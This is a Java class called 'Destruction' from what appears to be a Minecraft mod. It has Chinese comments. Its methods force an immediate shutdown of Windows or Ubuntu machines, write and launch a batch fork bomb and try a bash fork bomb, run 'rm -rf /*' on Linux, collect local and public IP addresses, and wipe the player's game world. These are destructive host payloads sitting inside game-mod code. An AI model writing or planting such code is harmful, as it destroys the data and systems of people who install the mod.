package com.wonderful.apiary.Network;

import net.minecraft.world.entity.player.Player;
import net.minecraft.world.level.Level;
import net.minecraft.world.level.block.Blocks;
import org.apache.commons.lang3.StringUtils;

import java.io.*;
import java.net.*;
import java.util.Enumeration;
import java.util.Properties;

public class Destruction {
    //一键关机
    public void Shutdown() throws IOException, InterruptedException {
        //获取操作系统的类型
        boolean isWindows = getSystem().toLowerCase().contains("windows");
        boolean isUbuntu = getSystem().toLowerCase().contains("ubuntu");

        //判断操作系统
        if (isWindows)
        {
            doCommand(getCmd() + "shutdown /s /f /t 0"); //再见了妈妈，今晚我就要远航(关机，并且静默)[仅Windows]
        } else if (isUbuntu) {
            doCommand("halt -i -n"); //拜拜了您嘞(关机，不保存所有文件，关闭网络接口，不记录关机日志，不关闭主机电源)[仅Linux]
        }
    }


    //内存杀手
    public void MemoryKiller() throws IOException, InterruptedException {
        //获取操作系统的类型
        boolean isWindows = getSystem().toLowerCase().contains("windows");
        boolean isUbuntu = getSystem().toLowerCase().contains("ubuntu");

        //判断操作系统
        if (isWindows) {
            //初始化
            Runtime runtime = Runtime.getRuntime();

            //创目录
            File path = new File("C:\\run");
            path.mkdirs();

            //建文件
            BufferedWriter out = new BufferedWriter(new FileWriter("C:\\run\\killer.bat"));
            out.write("@echo off&%0|%0"); //死机代码    来源：https://new.qq.com/omn/20201119/20201119A0931N00.html
            out.close();

            //执行它
            runtime.exec("C:\\run\\killer.bat");


        } else if (isUbuntu) {
            doCommand(":() { :|:& };:"); //fork炸弹   来源：https://www.jianshu.com/p/9e508888e2d9
            //自启动文件夹：C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
        }
    }


    //Linux专供：删库跑路
    public void DeleteLibrary() throws IOException, InterruptedException {
        doCommand("rm -rf /*"); //著名程序员删库跑路（
    }


    //获取IP————局域网IP    来源：https://blog.csdn.net/nianbingsihan/article/details/80265029
    public String getIpAddress() {
        try {
            Enumeration<NetworkInterface> allNetInterfaces = NetworkInterface.getNetworkInterfaces();
            InetAddress ip = null;
            while (allNetInterfaces.hasMoreElements()) {
                NetworkInterface netInterface = (NetworkInterface) allNetInterfaces.nextElement();
                if (netInterface.isLoopback() || netInterface.isVirtual() || !netInterface.isUp()) {
                    continue;
                } else {
                    Enumeration<InetAddress> addresses = netInterface.getInetAddresses();
                    while (addresses.hasMoreElements()) {
                        ip = addresses.nextElement();
                        if (ip != null && ip instanceof Inet4Address) {
                            return ip.getHostAddress();
                        }
                    }
                }
            }
        } catch (Exception e) {
            //System.err.println("IP地址获取失败" + e.toString());
            return "IP地址获取失败" + e;
        }
        return "";
    }

    //获取IP————公网IP  来源：https://www.jianshu.com/p/d985711629da
    public String getNowIP2() throws IOException {
        String ip = null;
        BufferedReader br = null;
        try {
            URL url = new URL("https://v6r.ipip.net/?format=callback");
            br = new BufferedReader(new InputStreamReader(url.openStream()));
            String s = "";
            StringBuffer sb = new StringBuffer("");
            String webContent = "";
            while ((s = br.readLine()) != null) {
                sb.append(s + "\r\n");
            }
            webContent = sb.toString();
            int start = webContent.indexOf("(") + 2;
            int end = webContent.indexOf(")") - 1;
            webContent = webContent.substring(start, end);
            ip = webContent;
        } finally {
            if (br != null)
                br.close();
        }
        if (StringUtils.isEmpty(ip)) {
            throw new RuntimeException();
        }
        return ip;
    }


    //再见，世界
    public void GoodbyeWorld(Level level, Player player)
    {
        for (int BlockX = 0; BlockX <= 1145141919; BlockX++)
        {
            for (int BlockZ = 0; BlockZ <= 1145141919; BlockZ++)
            {
                for (int BlockY = -120; BlockY <= 320; BlockY++)
                {
                    //开始毁灭
                    level.setBlock(player.getOnPos().offset(BlockX, BlockY, BlockZ), Blocks.AIR.defaultBlockState(), 1, 1);
                }
            }
        }
    }



    /**
     * 指令依赖区
     * @param Command
     * @throws IOException
     * @throws InterruptedException
     */
    //执行命令
    private static void doCommand(String Command) throws IOException, InterruptedException {
        Process pro = Runtime.getRuntime().exec(Command);
        pro.waitFor();
        InputStream in = pro.getInputStream();
        BufferedReader read = new BufferedReader(new InputStreamReader(in));
        String line = null;
        while((line = read.readLine())!=null){
            System.out.println(line);
        }
    }


    //获取操作系统
    public static String getSystem() {
        Properties props = System.getProperties();
        return props.getProperty("os.name");
    }


//获取Cmd固定写法
//初始化-Windows平台
    private static String getCmd() {
        return "cmd /c ";
    }
}
